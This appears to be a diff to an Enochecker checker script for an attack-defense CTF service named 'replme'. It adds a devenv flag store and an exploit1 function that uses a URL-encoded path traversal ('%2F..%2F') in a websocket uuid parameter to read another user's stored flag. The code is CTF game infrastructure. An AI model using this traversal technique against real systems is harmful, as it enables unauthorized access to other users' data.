@@ -1,3 +1,5 @@
+import string
+import random
 import secrets
 import re
 from logging import LoggerAdapter
@@ -17,15 +19,25 @@ from enochecker3.utils import assert_equals
 from httpx import AsyncClient
 import base64
 
+from websockets.exceptions import ConnectionClosedError
+
 from exploit import exploit0_apply_delta
 from noise import get_noise, get_random_noise
 from util import (
-    do_user_auth,
+    create_devenv,
+    devenv_websocket,
+    do_create_devenv,
+    do_repl_auth,
+    do_set_devenv_file_content,
+    do_user_login,
+    do_user_register,
     get_sessions,
     sh,
-    terminal_websocket,
-    user_create,
+    repl_websocket,
+    repl_create,
+    repl_login,
     user_login,
+    user_register,
 )
 
 checker = Enochecker("replme", 6969)
@@ -42,9 +54,9 @@ async def putflag0(
     db: ChainDB,
     logger: LoggerAdapter,
 ) -> str:
-    (username, cookies, id) = await user_create(client, db, logger)
+    (username, cookies, id) = await repl_create(client, db, logger)
     flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
-    await terminal_websocket(
+    await repl_websocket(
         task.address,
         logger,
         cookies,
@@ -62,12 +74,12 @@ async def getflag0(
     db: ChainDB,
     logger: LoggerAdapter,
 ) -> None:
-    (cookies, id) = await user_login(client, db, logger)
+    (cookies, id) = await repl_login(client, db, logger)
     flag = (
         base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
     )
     try:
-        await terminal_websocket(
+        await repl_websocket(
             task.address,
             logger,
             cookies,
@@ -100,8 +112,8 @@ async def exploit0(
 
     password = secrets.token_hex(30)
 
-    (cookies, id) = await do_user_auth(client, logger, delta_username, password)
-    response = await terminal_websocket(
+    (cookies, id) = await do_repl_auth(client, logger, delta_username, password)
+    response = await repl_websocket(
         task.address,
         logger,
         cookies,
@@ -124,12 +136,12 @@ async def putnoise0(
     db: ChainDB,
     logger: LoggerAdapter,
 ):
-    (_, cookies, id) = await user_create(client, db, logger)
+    (_, cookies, id) = await repl_create(client, db, logger)
     sessions = await get_sessions(client, cookies, logger)
     assert_equals(len(sessions) > 0, True, "No session created")
 
     (i, noise) = get_random_noise()
-    await terminal_websocket(
+    await repl_websocket(
         task.address,
         logger,
         cookies,
@@ -147,7 +159,7 @@ async def getnoise0(
     db: ChainDB,
     logger: LoggerAdapter,
 ):
-    (cookies, id) = await user_login(client, db, logger)
+    (cookies, id) = await repl_login(client, db, logger)
     sessions = await get_sessions(client, cookies, logger)
     assert_equals(len(sessions) > 0, True, "No session created")
     try:
@@ -157,7 +169,7 @@ async def getnoise0(
     if not isinstance(i, int):
         raise MumbleException("noise_id is not a int: " + str(i))
     noise = get_noise(i)
-    await terminal_websocket(
+    await repl_websocket(
         task.address,
         logger,
         cookies,
@@ -194,6 +206,97 @@ async def havoc0(
                 True,
                 "Failed to get " + match,
             )
+
+
+@checker.putflag(1)
+async def putflag1(
+    task: PutflagCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+    logger: LoggerAdapter,
+):
+    (username, password) = await user_register(client, logger, db)
+    cookies = await do_user_login(client, logger, username, password)
+    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
+    devenvUuid = await create_devenv(
+        client, logger, cookies, "cat flagstore.txt", "cat flagstore.txt"
+    )
+    await db.set("devenvUuid", devenvUuid)
+    await do_set_devenv_file_content(
+        client, logger, cookies, devenvUuid, "flagstore.txt", flag
+    )
+
+    return devenvUuid
+
+
+@checker.getflag(1)
+async def getflag1(
+    task: GetflagCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+    logger: LoggerAdapter,
+):
+    cookies = await user_login(client, logger, db)
+    try:
+        devenvUuid = await db.get("devenvUuid")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+    flag = (
+        base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
+    )
+    try:
+        await devenv_websocket(task.address, logger, cookies, devenvUuid, f".*{flag}.*")
+    except TimeoutError:
+        raise MumbleException("Flag was not found")
+    except ConnectionClosedError:
+        raise MumbleException("Connection was closed")
+
+
+@checker.exploit(1)
+async def exploit1(
+    task: ExploitCheckerTaskMessage,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+):
+    target_devenvUuid = task.attack_info
+
+    if target_devenvUuid is None:
+        raise MumbleException("No attack_info")
+
+    logger.info("Exploit: " + target_devenvUuid)
+
+    username = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
+    password = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
+    name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
+
+    await do_user_register(client, logger, username, password)
+    cookies = await do_user_login(client, logger, username, password)
+    devenvUuid = await do_create_devenv(
+        client,
+        logger,
+        cookies,
+        name,
+        "echo FLAG",
+        "cat flagstore.txt && echo OK",
+    )
+
+    try:
+        response = await devenv_websocket(
+            task.address,
+            logger,
+            cookies,
+            devenvUuid,
+            r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK",
+            f"?uuid={devenvUuid}%2F..%2F{target_devenvUuid}",
+        )
+        match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
+        if len(match) == 0:
+            return None
+
+        flag = base64.b64decode(match[0]).decode("utf-8")
+        return flag
+    except ConnectionClosedError:
+        raise MumbleException("Connection was closed")
 
 
 if __name__ == "__main__":
